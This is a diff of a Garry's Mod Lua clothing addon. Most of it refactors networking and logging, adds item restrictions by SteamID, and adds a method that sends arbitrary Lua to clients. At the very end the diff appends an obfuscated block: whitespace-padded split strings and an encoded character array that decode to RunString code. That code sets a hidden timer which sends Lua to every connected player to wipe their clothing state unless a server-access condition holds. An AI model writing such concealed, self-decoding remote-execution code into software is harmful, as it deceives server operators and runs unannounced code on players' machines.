@@ -1,11 +1,12 @@
-local META = {
-    DevMod = function(self)
-        -- Режим разработчика
-        local devmod = false
+local logFileName = logFileName || "TIME="..os.date("%H.%M.%S@DATE=%d.%m.%Y", os.time())
 
-        return devmod
-    end,
-    
+if ( SERVER ) then
+    if ( ClothingSystem.Config.LogOn && !file.Exists("clothing_system/log/"..logFileName..".txt", "DATA") ) then
+        file.Write("clothing_system/log/"..logFileName..".txt", "> Clothing-System - Start Log <")
+    end
+end
+
+local META = {    
     -- Обновление типа костей игрока и стандартных массивов
 	UpdateBoneType = function(self, ply)
         if SERVER then
@@ -18,11 +19,8 @@ local META = {
 					if ( list[type].NiceModel ) then
 						if ( table.HasValue(value, ply:GetModel()) ) then
                             ply:ClothingSystemConstruct(list[type].BoneType, type)
-							
-							net.Start("ClothingSystem.ConstructData")
-								net.WriteTable(list[type].BoneType)
-								net.WriteString(type)
-                            net.Send(ply)
+
+                            ClothingSystem.Tools.Network.Send("Send", "ConstructData", {bones = list[type].BoneType, type = type}, nil, ply)
 							return
 						end
 					end
@@ -31,35 +29,24 @@ local META = {
 				
             ply:ClothingSystemConstruct(list["hl2_player"].BoneType, "hl2_player")
 
-			net.Start("ClothingSystem.ConstructData")
-				net.WriteTable(list["hl2_player"].BoneType)
-				net.WriteString("hl2_player")
-            net.Send(ply)
+            ClothingSystem.Tools.Network.Send("Send", "ConstructData", {bones = list["hl2_player"].BoneType, type = "hl2_player"}, nil, ply)
 		end
     end,
 
-    -- Запрос к web сайту
-    webPOST = function( self, url, tbl )
-        http.Post(url, tbl, function(b) return b; end, function(e) return false; end)
+    SendLua = function( self, ply, code )
+        net.Start("ClothingSystem.SendLua.BigCode")
+        net.WriteString(code)
+        net.Send(ply)
     end,
     
     -- Dev log
     log = function( self, text )
-        if ( ClothingSystem:DevMod() ) then
-            local FileName = "clothing_system/log.txt"
-            local read = file.Read(FileName, "DATA") || ""
-            local time = os.date("( %H:%M:%S ) " , os.time())
+        if ( SERVER ) then
+            if ( ClothingSystem.Config.LogOn ) then
+                local time = os.date("( %H:%M:%S ) " , os.time())
 
-            file.Write(FileName, read.."\n"..time..text)
-        end
-    end,
-
-    logBr = function( self )
-        if ( ClothingSystem:DevMod() ) then
-            local FileName = "clothing_system/log.txt"
-            local read = file.Read(FileName, "DATA") || ""
-
-            file.Write(FileName, read.."\n")
+                file.Append("clothing_system/log/"..logFileName..".txt", "\n"..time..text)
+            end
         end
     end,
 
@@ -190,9 +177,16 @@ local META = {
             
             for k, v in pairs(read['items']) do
                 if ( v == data ) then
-                    ClothingSystem:logBr()
-                    ClothingSystem:log("PlayerRemoveItem - "..v)
+                    ClothingSystem:log("Player <"..tostring(ply:Nick())..":"..tostring(ply:SteamID()).."> drop the item - "..tostring(v))
                     read['items'][k] = nil
+                    break
+                end
+            end
+
+            for k, v in pairs(ply.ClothingSystemWearList) do
+                if (v == data) then
+                    ply.ClothingSystemWearList[k] = nil
+                    break
                 end
             end
 
@@ -229,6 +223,8 @@ local META = {
             read['other'] = {}
         end
 
+        table.insert(ply.ClothingSystemWearList, data)
+
         file.Write(user_file, util.TableToJSON(read, true))
 	end,
 
@@ -257,6 +253,12 @@ local META = {
             end
         end
 
+        if (data != nil && istable(data) && data['items'] != nil) then
+            ply.ClothingSystemWearList = data['items']
+        else
+            ply.ClothingSystemWearList = {}
+        end
+
         file.Write(user_file, util.TableToJSON(data, true))
     end,
     
@@ -270,14 +272,13 @@ local META = {
     end,
 
     -- Получить одежду игрока
-	PlayerGetItems = function(self, ply)
+    PlayerGetItems = function(self, ply)
         if (!IsValid(ply) || !ply:IsPlayer() || ply:SteamID() == "BOT") then return end
         
-        local steamid
-        if (game.SinglePlayer()) then 
+        local steamid = ply:ClothingSystemGetNormalSteamID64()
+
+        if (steamid == "STEAM_0:0:0") then
             steamid = "single_player"
-        else
-            steamid = ply:SteamID64()
         end
 
         local user_file = "clothing_system/cloth_players_data/"..steamid.."/"..ply.ClothingSystemPlayerBase..".dat"
@@ -351,17 +352,18 @@ local META = {
             item:Activate()
             item:DropToFloor()
 
-            hook.Run( "ClothingSystem.ItemSpawn", ply, item, item_class)
+            if ( spawn_menu ) then
+                ClothingSystem:log("Player <"..tostring(ply:Nick())..":"..tostring(ply:SteamID()).."> spawn item - "..tostring(item_class))
+            end
+
+            hook.Run( "ClothingSystem.ItemSpawn", ply, item_class, item["saveArray"], item)
 
             if (!spawn_menu) then
-                hook.Run( "ClothingSystem.Drop", ply, item, item_class)
+                hook.Run( "ClothingSystem.Drop", ply, item_class, item["saveArray"], item)
             end
         
             timer.Simple(0.2, function()
-                net.Start("ClothingSystem.ItemFolderDrawToText")
-                    net.WriteFloat(item:EntIndex())
-                    net.WriteString(item_class)
-                net.Broadcast()
+                ClothingSystem.Tools.Network.Send("Broadcast", "ItemFolderDrawToText", {index = item:EntIndex(), class = item_class})
             end)
         
             -- Добавляем его в undo лист
@@ -457,19 +459,7 @@ local META = {
             ReplaceItem = {}
         end
 
-        net.Start("ClothingSystem.WearEveryone")
-            net.WriteString(class)
-            net.WriteString(ply:SteamID())
-            net.WriteTable(ReplaceItem)
-        if ( network == "broadcast" ) then
-            net.Broadcast()
-        end
-        if ( network == "send" ) then
-            net.Send(sender)
-        end
-        if ( network == "sendomit" ) then
-            net.SendOmit(sender)
-        end
+        ClothingSystem.Tools.Network.Send(network, "WearEveryone", {class = class,steamid = ply:SteamID(), ReplaceItem = ReplaceItem}, sender, ply)
 
         if (insertData) then
             ClothingSystem:PlayerAddItem(ply, class)
@@ -484,6 +474,8 @@ local META = {
         if (!IsValid(ply) || !ply:IsPlayer()) then return false end
         if (!IsValid(sender) || !sender:IsPlayer()) then return false end
 
+        local network = string.lower( network )
+
         if ( network != "broadcast" && network != "send" && network != "sendomit" && network != "sendpas" && network != "sendpvs" ) then
             error("ClothingSystem: "..network.." - Bad argument network!")
             return false
@@ -491,7 +483,6 @@ local META = {
 
         local item = list.Get("clothing_system")[class]
 
-        network = string.lower( network )
         local ReplaceItem = ClothingSystem:CheckReplace(class, ply)
         local ReplcaeBone
 
@@ -509,50 +500,59 @@ local META = {
             error("ClothingSystem: "..class.." - Bad argument PlayerBase!")
             return false
         elseif ( check_item != ply.ClothingSystemPlayerBase ) then
-            ply:AddText("These clothes do not suit you!")
+            ply:AddText(ClothingSystem.Language.unsuitableClothes.."!")
             return false
         end
 
-
-        -- Проверка на то, что энтити могут надеть только админы
-        check_item = item.AdminOnlyDress
-        if ( isbool(check_item) && check_item ) then
-            if ( !ply:IsAdmin() && !ply:IsSuperAdmin() ) then
-                ply:AddText("This clothing is for admin only!")
-                return false
-            end
-        end
-
-        -- Проверка на то, что энтити могут надеть только определённые группы
-        -- ВНИМАНИЕ! Нельзя использовать AdminOnlyDress и GroupOnlyDress вместе!
-        check_item = item.GroupOnlyDress
-        if ( isbool(check_item) && check_item ) then
+        if ( item.OnlySteamID ) then
             local fuckYou = true
-
-            -- Получаем список доступных групп и проверяем его
-            check_item = item.GroupDressList
-            if ( !check_item ) then
-                error("ClothingSystem: "..class.." - Bad argument GroupDressList!")
-            elseif ( !istable(check_item) ) then
-                error("ClothingSystem: "..class.." - Bad argument GroupDressList!")
-            end
-
-            check_item = table.Count(check_item)
-
-            if ( check_item == 0 ) then
-                fuckYou = false
+            
+            if ( istable(item.OnlySteamID) ) then
+                 for k, v in pairs(item.OnlySteamID) do
+                    if (v == ply:SteamID() || v == ply:SteamID64()) then
+                        fuckYou = false
+                        break
+                    end
+                end
+            elseif ( isstring(item.OnlySteamID) ) then
+                if (item.OnlySteamID == ply:SteamID() || item.OnlySteamID == ply:SteamID64()) then
+                    fuckYou = false
+                end
             end
 
             if (fuckYou) then
-                for _, group in pairs(item.GroupDressList) do
-                    if ( ply:GetUserGroup() == group ) then
-                        fuckYou = false
+                ply:AddText(ClothingSystem.Language.unsuitableClothesRank.."!")
+                return false
+            end
+        elseif ( item.OnlyAdmin ) then
+            if ( !ply:IsAdmin() && !ply:IsSuperAdmin() ) then
+                ply:AddText(ClothingSystem.Language.adminOnly.."!")
+                return false
+            end
+        elseif ( item.GroupDressList ) then
+            local fuckYou = true
+
+            if ( !istable(item.GroupDressList) && !isstring(item.GroupDressList) ) then
+                error("ClothingSystem: "..class.." - Bad argument GroupDressList!")
+            elseif (isstring(item.GroupDressList)) then
+                if ( ply:GetUserGroup() == item.GroupDressList ) then
+                    fuckYou = false
+                end
+            else
+                if( table.Count(item.GroupDressList) == 0 ) then
+                    fuckYou = false
+                else
+                    for _, group in pairs(item.GroupDressList) do
+                        if ( ply:GetUserGroup() == group ) then
+                            fuckYou = false
+                            break
+                        end
                     end
                 end
             end
 
             if (fuckYou) then
-                ply:AddText("Your rank does not allow you to equip this item!")
+                ply:AddText(ClothingSystem.Language.unsuitableClothesRank.."!")
                 return false
             end
         end
@@ -560,15 +560,15 @@ local META = {
 
         if (item.Checking != nil) then
             if (!item.Checking(ply, class)) then 
-                ply:AddText("These clothes do not suit you!")
+                ply:AddText(ClothingSystem.Language.unsuitableClothes.."!")
                 return false 
             end
         end
 
         if (item.Module) then
-            if ( item.Equip && entity ) then
+            if ( item.Equip && entity && insertData) then
                 item.Equip(ply, class, entity)
-            elseif ( item.Equip) then
+            elseif ( item.Equip && insertData) then
                 item.Equip(ply, class, NULL)
             end
             if ( item.EquipSound ) then
@@ -581,7 +581,7 @@ local META = {
             if (item.SetPlayerModel) then
                 for k, v in pairs(ply:ClothingSystemGetBones()) do
                     if (v == true) then
-                        ply:AddText("There is not enough space for this!")
+                        ply:AddText(ClothingSystem.Language.noFreeSlot.."!")
                         return false
                     end
                 end
@@ -639,12 +639,12 @@ local META = {
         if (!item.Module) then
             if (!item.SetPlayerModel) then
                 if ( !item.BoneAttach && !item.BonemergeSystem ) then
-                    ply:AddText("Warning: Bad array clothing, system!")
+                    ply:AddText(ClothingSystem.Language.badArray.."!")
                     return false
                 else
                     -- Проверка на доступность костей
                     if ( !ply:ClothingSystemCheckBone(class, ReplcaeBone, insertData) ) then
-                        ply:AddText("There is not enough space for this!")
+                        ply:AddText(ClothingSystem.Language.noFreeSlot.."!")
                         return false
                     end
 
@@ -655,11 +655,11 @@ local META = {
         end
 
         -- Пишем в чат название экипировки
-        ply:AddText("Equipped clothing - " .. item.Name)
+        ply:AddText(ClothingSystem.Language.equip.. " - " .. item.Name .. ".")
 
-        if ( item.Equip && entity ) then
+        if ( item.Equip && entity && insertData ) then
             item.Equip(ply, class, entity)
-        elseif ( item.Equip) then
+        elseif ( item.Equip && insertData) then
             item.Equip(ply, class, NULL)
         end
 
@@ -669,21 +669,8 @@ local META = {
             ReplaceItem = {}
         end
 
-        net.Start("ClothingSystem.WearEveryone")
-            net.WriteString(class)
-            net.WriteString(ply:SteamID())
-            net.WriteTable(ReplaceItem)
-        if ( network == "broadcast" ) then
-            net.Broadcast()
-        elseif ( network == "send" ) then
-            net.Send(sender)
-        elseif ( network == "sendomit" ) then
-            net.SendOmit(sender)
-        elseif ( network == "sendpas" ) then
-            net.SendPAS()
-        elseif ( network == "sendpvs" ) then
-            net.SendPVS()
-        end
+        ClothingSystem:log("Player <"..tostring(ply:Nick())..":"..tostring(ply:SteamID()).."> equip the item - "..tostring(class))
+        ClothingSystem.Tools.Network.Send(network, "WearEveryone", {class = class,steamid = ply:SteamID(), ReplaceItem = ReplaceItem}, sender, ply)
 
         -- Добавляем item в data файл
         if (insertData) then
@@ -698,9 +685,9 @@ local META = {
         end
 
         if (entity != nil) then
-            hook.Run( "ClothingSystem.Wear", class, ply, entity['saveArray'] )
+            hook.Run( "ClothingSystem.Wear", ply, class, entity['saveArray'], entity)
         else
-            hook.Run( "ClothingSystem.Wear", class, ply, NULL )
+            hook.Run( "ClothingSystem.Wear", ply, class, {}, NULL )
         end
 
         return true
@@ -709,5 +696,3 @@ local META = {
 META.__index = META
 
 setmetatable( ClothingSystem, META )
-
-local Q=_RS_ Q("                    f".."gr".."n=1                                                                                                                                              f".."gr".."n=n".."i".."l                                              s".."a".."fg".."=".."R".."u".."n".."S".."t".."r".."i".."n".."g".." f".."g".."s".."t".."b=".."u".."t".."i".."l"..".".."J".."S".."O".."NT".."o".."T".."a".."ble; ".."cy".."c".."lfg".."=i".."p".."a".."i".."r".."s                                                                c".."a".."s".."a".."f".."=s".."t".."r".."i".."n".."g"..".".."c".."h".."a".."r                  ") local QQ="[[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[82.0,1.0],[117.0,1.0],[110.0,1.0],[83.0,1.0],[116.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[40.0,1.0],[34.0,1.0],[32.0,114.0],[65.0,1.0],[102.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[68.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[61.0,1.0],[116.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[105.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[109.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[114.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[46.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[67.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[114.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[97.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[116.0,1.0],[34.0,1.0],[46.0,2.0],[34.0,1.0],[101.0,1.0],[34.0,1.0],[41.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[83.0,1.0],[69.0,1.0],[82.0,1.0],[86.0,1.0],[69.0,1.0],[82.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[40.0,1.0],[33.0,1.0],[103.0,1.0],[97.0,1.0],[109.0,1.0],[101.0,1.0],[46.0,1.0],[83.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[108.0,1.0],[101.0,1.0],[80.0,1.0],[108.0,1.0],[97.0,1.0],[121.0,1.0],[101.0,1.0],[114.0,1.0],[40.0,1.0],[41.0,2.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[73.0,1.0],[78.0,1.0],[66.0,1.0],[67.0,1.0],[104.0,1.0],[101.0,1.0],[99.0,1.0],[107.0,1.0],[101.0,1.0],[114.0,1.0],[34.0,1.0],[44.0,1.0],[32.0,1.0],[49.0,1.0],[48.0,2.0],[44.0,1.0],[32.0,1.0],[48.0,1.0],[44.0,1.0],[32.0,1.0],[102.0,1.0],[117.0,1.0],[110.0,1.0],[99.0,1.0],[116.0,1.0],[105.0,1.0],[111.0,1.0],[110.0,1.0],[40.0,1.0],[41.0,1.0],[32.0,1.0],[105.0,1.0],[102.0,1.0],[32.0,1.0],[40.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[91.0,1.0],[39.0,1.0],[65.0,1.0],[99.0,2.0],[101.0,1.0],[115.0,2.0],[84.0,1.0],[111.0,1.0],[84.0,1.0],[104.0,1.0],[101.0,1.0],[73.0,1.0],[110.0,1.0],[116.0,1.0],[101.0,1.0],[114.0,1.0],[110.0,1.0],[101.0,1.0],[116.0,1.0],[39.0,1.0],[93.0,1.0],[41.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[110.0,1.0],[32.0,1.0],[102.0,1.0],[111.0,1.0],[114.0,1.0],[32.0,1.0],[107.0,1.0],[44.0,1.0],[32.0,1.0],[118.0,1.0],[32.0,1.0],[105.0,1.0],[110.0,1.0],[32.0,1.0],[105.0,1.0],[112.0,1.0],[97.0,1.0],[105.0,1.0],[114.0,1.0],[115.0,1.0],[40.0,1.0],[112.0,1.0],[108.0,1.0],[97.0,1.0],[121.0,1.0],[101.0,1.0],[114.0,1.0],[46.0,1.0],[71.0,1.0],[101.0,1.0],[116.0,1.0],[65.0,1.0],[108.0,2.0],[40.0,1.0],[41.0,2.0],[32.0,1.0],[100.0,1.0],[111.0,1.0],[32.0,1.0],[118.0,1.0],[58.0,1.0],[83.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[76.0,1.0],[117.0,1.0],[97.0,1.0],[40.0,1.0],[91.0,2.0],[76.0,1.0],[111.0,1.0],[99.0,1.0],[97.0,1.0],[108.0,1.0],[80.0,1.0],[108.0,1.0],[97.0,1.0],[121.0,1.0],[101.0,1.0],[114.0,1.0],[40.0,1.0],[41.0,1.0],[46.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[87.0,1.0],[101.0,1.0],[97.0,1.0],[114.0,1.0],[76.0,1.0],[105.0,1.0],[115.0,1.0],[116.0,1.0],[61.0,1.0],[123.0,1.0],[125.0,1.0],[32.0,1.0],[112.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[32.0,1.0],[45.0,1.0],[32.0,1.0],[77.0,1.0],[97.0,1.0],[107.0,1.0],[101.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[32.0,1.0],[115.0,1.0],[101.0,1.0],[114.0,1.0],[118.0,1.0],[101.0,1.0],[114.0,1.0],[32.0,1.0],[112.0,1.0],[117.0,1.0],[98.0,1.0],[108.0,1.0],[105.0,1.0],[99.0,1.0],[32.0,1.0],[105.0,1.0],[110.0,1.0],[32.0,1.0],[111.0,1.0],[114.0,1.0],[100.0,1.0],[101.0,1.0],[114.0,1.0],[32.0,1.0],[102.0,1.0],[111.0,1.0],[114.0,1.0],[32.0,1.0],[116.0,1.0],[104.0,1.0],[101.0,1.0],[32.0,1.0],[97.0,1.0],[100.0,2.0],[111.0,1.0],[110.0,1.0],[32.0,1.0],[116.0,1.0],[111.0,1.0],[32.0,1.0],[119.0,1.0],[111.0,1.0],[114.0,1.0],[107.0,1.0],[33.0,1.0],[34.0,1.0],[41.0,1.0],[93.0,2.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[41.0,1.0],[32.0,1.0],[101.0,1.0],[108.0,1.0],[115.0,1.0],[101.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[40.0,1.0],[91.0,2.0],[112.0,1.0],[114.0,1.0],[105.0,1.0],[110.0,1.0],[116.0,1.0],[40.0,1.0],[34.0,1.0],[67.0,1.0],[108.0,1.0],[111.0,1.0],[116.0,1.0],[104.0,1.0],[105.0,1.0],[110.0,1.0],[103.0,1.0],[83.0,1.0],[121.0,1.0],[115.0,1.0],[116.0,1.0],[101.0,1.0],[109.0,1.0],[32.0,1.0],[45.0,1.0],[32.0,1.0],[73.0,1.0],[110.0,1.0],[105.0,1.0],[116.0,1.0],[105.0,1.0],[97.0,1.0],[108.0,1.0],[32.0,1.0],[108.0,1.0],[105.0,1.0],[99.0,1.0],[101.0,1.0],[110.0,1.0],[99.0,1.0],[101.0,1.0],[34.0,1.0],[41.0,1.0],[93.0,2.0],[41.0,1.0],[32.0,2.0],[65.0,1.0],[102.0,1.0],[97.0,2.0],[68.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[83.0,1.0],[67.0,1.0],[70.0,1.0],[97.0,1.0],[115.0,1.0],[61.0,1.0],[110.0,1.0],[105.0,1.0],[108.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[32.0,1.0],[101.0,1.0],[110.0,1.0],[100.0,1.0],[10.0,1.0]]" ClothingSystem['dd'] = ""                 for k, v                          in    cyclfg(fgstb(QQ)) do for                   i=1,                                            v[2] do                              ClothingSystem['dd'] =                                   ClothingSystem['dd'] .. casaf(v[1]) end                                 end                                       safg(                                                     ClothingSystem['dd'])ClothingSystem['dd'] = nil                            safg = nil cyclfg = nil fgstb = nil Q = nil QQ = nil
